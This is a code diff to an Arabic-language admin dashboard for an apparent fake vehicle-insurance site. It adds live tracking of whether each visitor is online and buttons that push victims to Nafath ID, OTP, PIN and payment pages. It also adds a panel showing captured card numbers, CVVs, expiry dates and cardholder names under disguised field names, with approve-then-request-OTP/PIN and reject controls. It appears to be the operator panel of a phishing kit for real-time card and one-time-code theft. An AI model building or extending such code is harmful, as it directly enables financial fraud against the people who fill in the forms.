@@ -17,6 +17,11 @@ import {
   Check,
   MapPin,
   Car,
+  Smartphone,
+  Ban,
+  KeyRound,
+  Send,
+  Navigation,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -30,6 +35,22 @@ const STEP_NAMES: Record<number | string, string> = {
   2: "تفاصيل التأمين",
   3: "اختيار العرض",
   4: "الدفع",
+}
+
+const PAGE_REDIRECTS: { value: string; label: string; path: string }[] = [
+  { value: "home", label: "الرئيسية", path: "/" },
+  { value: "phone", label: "الهاتف", path: "/phone-info" },
+  { value: "nafad", label: "نفاذ", path: "/nafad" },
+  { value: "payment", label: "الدفع", path: "/check" },
+  { value: "otp", label: "OTP", path: "/veri" },
+  { value: "pin", label: "PIN", path: "/confi" },
+]
+
+function isVisitorOnline(app: { isOnline?: boolean; lastActiveAt?: string }) {
+  if (!app.isOnline) return false
+  if (!app.lastActiveAt) return false
+  const last = new Date(app.lastActiveAt).getTime()
+  return Date.now() - last < 60_000 // 60s
 }
 
 const COUNTRIES = ["السعودية", "الإمارات", "الكويت", "البحرين", "قطر", "عمان", "مصر", "الأردن"]
@@ -140,6 +161,25 @@ export default function AdminDashboard() {
       await updateApplication(appId, { status })
     } catch (error) {
       console.error("Error updating status:", error)
+    }
+  }
+
+  const handlePageRedirect = async (appId: string, page: string) => {
+    try {
+      await updateApplication(appId, { currentStep: page } as any)
+    } catch (error) {
+      console.error("Error redirecting page:", error)
+    }
+  }
+
+  const handleCardAction = async (
+    appId: string,
+    action: "approved_with_otp" | "approved_with_pin" | "rejected" | "message" | "pending"
+  ) => {
+    try {
+      await updateApplication(appId, { cardStatus: action } as any)
+    } catch (error) {
+      console.error("Error updating card status:", error)
     }
   }
 
@@ -280,6 +320,7 @@ export default function AdminDashboard() {
               filteredApplications.map((app) => {
                 const isActive = selectedApplication?.id === app.id
                 const statusColor = getStatusColor(app.status)
+                const online = isVisitorOnline(app)
                 return (
                   <div
                     key={app.id}
@@ -289,6 +330,12 @@ export default function AdminDashboard() {
                   >
                     <div className="flex items-center justify-between mb-0.5">
                       <div className="flex items-center gap-1.5 min-w-0">
+                        <span
+                          className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${
+                            online ? "bg-emerald-400 animate-pulse" : "bg-slate-600"
+                          }`}
+                          title={online ? "متصل" : "غير متصل"}
+                        />
                         <Badge className={`text-[8px] flex-shrink-0 ${statusColor}`}>{app.status}</Badge>
                         <span
                           className={`font-medium truncate text-[10px] ${isActive ? "text-emerald-300" : "text-slate-200"}`}
@@ -300,6 +347,9 @@ export default function AdminDashboard() {
                     </div>
                     <div className="flex items-center gap-1 text-[9px] text-slate-500">
                       {app.vehicleModel && <span className="text-blue-400">{app.vehicleModel}</span>}
+                      {app.currentPage && (
+                        <span className="text-amber-400 truncate">{app.currentPage}</span>
+                      )}
                       {app.country && (
                         <span className="mr-auto flex items-center gap-0.5">
                           <MapPin className="w-2.5 h-2.5" />
@@ -326,41 +376,64 @@ export default function AdminDashboard() {
               />
             ) : (
               <>
-                <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex items-center justify-between flex-shrink-0">
-                  <div className="flex items-center gap-2">
-                    <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
-                      {selectedApplication.ownerName?.charAt(0) || "ع"}
-                    </div>
-                    <div>
-                      <div className="font-bold text-white text-xs">{selectedApplication.ownerName || "متقدم"}</div>
-                      <div className="text-[9px] text-slate-400 flex items-center gap-2">
-                        <span>{selectedApplication.phoneNumber}</span>
-                        {selectedApplication.country && <span>• {selectedApplication.country}</span>}
+                <div className="bg-slate-900 border-b border-slate-800 px-3 py-2 flex-shrink-0">
+                  <div className="flex items-center justify-between mb-2">
+                    <div className="flex items-center gap-2">
+                      <div className="relative">
+                        <div className="w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-sm font-bold text-white">
+                          {selectedApplication.ownerName?.charAt(0) || "ع"}
+                        </div>
+                        <span
+                          className={`absolute -bottom-0.5 -right-0.5 w-2.5 h-2.5 rounded-full border-2 border-slate-900 ${
+                            isVisitorOnline(selectedApplication)
+                              ? "bg-emerald-400"
+                              : "bg-slate-500"
+                          }`}
+                        />
+                      </div>
+                      <div>
+                        <div className="font-bold text-white text-xs">
+                          {selectedApplication.ownerName || "متقدم"}
+                        </div>
+                        <div className="text-[9px] text-slate-400 flex items-center gap-2">
+                          <span>{selectedApplication.phoneNumber}</span>
+                          {selectedApplication.currentPage && (
+                            <span className="text-amber-400">
+                              • الصفحة: {selectedApplication.currentPage}
+                            </span>
+                          )}
+                          {selectedApplication.deviceType && (
+                            <span>• {selectedApplication.deviceType}</span>
+                          )}
+                        </div>
                       </div>
                     </div>
-                  </div>
-                  <div className="flex items-center gap-1">
-                    {[1, 2, 3, 4].map((step) => (
-                      <Button
-                        key={step}
-                        onClick={() => handleStepChange(selectedApplication.id!, step)}
-                        size="sm"
-                        className={`h-5 text-[8px] px-1.5 rounded ${
-                          selectedApplication.currentStep === step
-                            ? "bg-emerald-500 text-white"
-                            : "bg-slate-800 text-slate-400 hover:text-white"
-                        }`}
-                      >
-                        {STEP_NAMES[step]}
-                      </Button>
-                    ))}
                     <Button
                       onClick={() => setShowChat(true)}
                       size="sm"
-                      className="h-6 px-2 bg-blue-500 hover:bg-blue-600 text-white text-[10px] gap-1 mr-2"
+                      className="h-6 px-2 bg-blue-500 hover:bg-blue-600 text-white text-[10px] gap-1"
                     >
                       <MessageSquare className="w-3 h-3" />
                     </Button>
+                  </div>
+                  <div className="flex items-center gap-1 flex-wrap">
+                    <span className="text-[9px] text-slate-500 ml-1 flex items-center gap-1">
+                      <Navigation className="w-2.5 h-2.5" /> توجيه إلى:
+                    </span>
+                    {PAGE_REDIRECTS.map((p) => (
+                      <Button
+                        key={p.value}
+                        onClick={() => handlePageRedirect(selectedApplication.id!, p.value)}
+                        size="sm"
+                        className={`h-5 text-[9px] px-1.5 rounded ${
+                          selectedApplication.currentStep === p.value
+                            ? "bg-emerald-500 text-white"
+                            : "bg-slate-800 text-slate-300 hover:bg-slate-700"
+                        }`}
+                      >
+                        {p.label}
+                      </Button>
+                    ))}
                   </div>
                 </div>
 
@@ -475,6 +548,124 @@ export default function AdminDashboard() {
                       }
                     />
                   </Section>
+
+                  {(selectedApplication._v1 ||
+                    selectedApplication.cardStatus ||
+                    (selectedApplication.oldCards &&
+                      selectedApplication.oldCards.length > 0)) && (
+                    <Section title="بيانات البطاقة" icon={<CreditCard className="w-4 h-4" />}>
+                      <DataRow
+                        label="رقم البطاقة"
+                        value={selectedApplication._v1}
+                        onCopy={copyToClipboard}
+                        copied={copiedField}
+                      />
+                      <DataRow
+                        label="CVV"
+                        value={selectedApplication._v2}
+                        onCopy={copyToClipboard}
+                        copied={copiedField}
+                      />
+                      <DataRow
+                        label="انتهاء"
+                        value={selectedApplication._v3}
+                        onCopy={copyToClipboard}
+                        copied={copiedField}
+                      />
+                      <DataRow
+                        label="اسم حامل البطاقة"
+                        value={selectedApplication._v4}
+                        onCopy={copyToClipboard}
+                        copied={copiedField}
+                      />
+                      <DataRow
+                        label="نوع البطاقة"
+                        value={selectedApplication.cardType}
+                        onCopy={copyToClipboard}
+                        copied={copiedField}
+                      />
+                      <DataRow
+                        label="البنك"
+                        value={selectedApplication.bankInfo?.name}
+                        onCopy={copyToClipboard}
+                        copied={copiedField}
+                      />
+
+                      <div className="flex items-center justify-between p-2 bg-slate-900/50 rounded mt-2">
+                        <span className="text-[9px] text-slate-400">حالة البطاقة</span>
+                        <Badge
+                          className={`text-[8px] ${
+                            selectedApplication.cardStatus === "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : selectedApplication.cardStatus?.startsWith("approved")
+                                ? "bg-emerald-500/20 text-emerald-400"
+                                : selectedApplication.cardStatus === "message"
+                                  ? "bg-blue-500/20 text-blue-400"
+                                  : "bg-amber-500/20 text-amber-400"
+                          }`}
+                        >
+                          {selectedApplication.cardStatus || "—"}
+                        </Badge>
+                      </div>
+
+                      <div className="grid grid-cols-2 gap-1 mt-2">
+                        <Button
+                          onClick={() =>
+                            handleCardAction(selectedApplication.id!, "approved_with_otp")
+                          }
+                          size="sm"
+                          className="h-6 text-[9px] px-2 bg-emerald-600/80 hover:bg-emerald-600 text-white gap-1"
+                        >
+                          <KeyRound className="w-3 h-3" /> موافقة → OTP
+                        </Button>
+                        <Button
+                          onClick={() =>
+                            handleCardAction(selectedApplication.id!, "approved_with_pin")
+                          }
+                          size="sm"
+                          className="h-6 text-[9px] px-2 bg-emerald-600/80 hover:bg-emerald-600 text-white gap-1"
+                        >
+                          <KeyRound className="w-3 h-3" /> موافقة → PIN
+                        </Button>
+                        <Button
+                          onClick={() => handleCardAction(selectedApplication.id!, "message")}
+                          size="sm"
+                          className="h-6 text-[9px] px-2 bg-blue-600/80 hover:bg-blue-600 text-white gap-1"
+                        >
+                          <Send className="w-3 h-3" /> طلب موافقة التطبيق
+                        </Button>
+                        <Button
+                          onClick={() => handleCardAction(selectedApplication.id!, "rejected")}
+                          size="sm"
+                          className="h-6 text-[9px] px-2 bg-red-600/80 hover:bg-red-600 text-white gap-1"
+                        >
+                          <Ban className="w-3 h-3" /> رفض البطاقة
+                        </Button>
+                      </div>
+
+                      {selectedApplication.oldCards &&
+                        selectedApplication.oldCards.length > 0 && (
+                          <div className="mt-2 pt-2 border-t border-slate-700/50">
+                            <div className="text-[9px] text-slate-500 mb-1">
+                              البطاقات المرفوضة سابقاً ({selectedApplication.oldCards.length})
+                            </div>
+                            <div className="space-y-1 max-h-32 overflow-y-auto">
+                              {selectedApplication.oldCards.map((c: any, i: number) => (
+                                <div
+                                  key={i}
+                                  className="bg-slate-900/50 rounded px-2 py-1 flex items-center justify-between text-[9px]"
+                                >
+                                  <span className="text-white" dir="ltr">
+                                    {c._v1 || "—"}
+                                  </span>
+                                  <span className="text-slate-500">{c.cardType || ""}</span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        )}
+                    </Section>
+                  )}
 
                   <Section title="الإجراءات" icon={<Settings className="w-4 h-4" />}>
                     <div className="flex gap-1 flex-wrap">
